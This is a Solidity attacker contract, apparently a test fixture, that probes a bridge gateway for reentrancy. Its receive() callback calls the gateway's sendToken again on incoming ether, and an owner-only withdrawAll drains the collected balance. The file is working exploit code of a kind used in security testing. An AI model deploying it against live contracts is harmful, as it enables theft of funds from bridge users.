// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {IGateway} from "../../src/interfaces/IGateway.sol";
import {ParaID, MultiAddress, multiAddressFromBytes32} from "../../src/Types.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    address public owner;
    IGateway targetContract;
    uint256 targetValue = 0.9 ether;
    uint256 fee;
    ParaID assetHub = ParaID.wrap(1000);
    uint128 amount = 1;
    uint128 extra = 1;
    MultiAddress recipientAddress32 = multiAddressFromBytes32(keccak256("recipient"));

    constructor(address _targetAddr) {
        targetContract = IGateway(_targetAddr);
        owner = msg.sender;
        fee = targetContract.quoteSendTokenFee(address(0), assetHub, 1);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint256 totalBalance = address(this).balance;
        (bool sent,) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint256 currentBalance = address(this).balance;
        console.log("%s:%d", "Attacker's current balance", currentBalance);
        uint256 gatewayBalance = address(targetContract).balance;
        console.log("%s:%d", "Gateway's current balance", gatewayBalance);
        if (currentBalance >= targetValue) {
            targetContract.sendToken{value: amount + fee + extra}(address(0), assetHub, recipientAddress32, 1, amount);
        }
    }
}
